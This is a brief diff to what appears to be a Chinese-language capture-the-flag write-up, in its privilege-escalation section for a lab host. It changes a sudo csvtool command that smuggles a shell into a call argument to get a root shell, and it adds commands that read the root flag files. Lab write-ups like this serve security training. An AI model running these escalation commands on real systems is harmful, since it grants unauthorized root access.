@@ -67,5 +67,6 @@ http://10.10.110.102/
 ## 提权
 
 ```bash
-sudo csvtool call '/bin/sh;false' /etc/passwd
+sudo csvtool call '/bin/bash;false' /etc/passwd
+cat /opt/flag.txt; echo -e "\n"; cat /root/flag.txt; echo -e "\n"
 ```
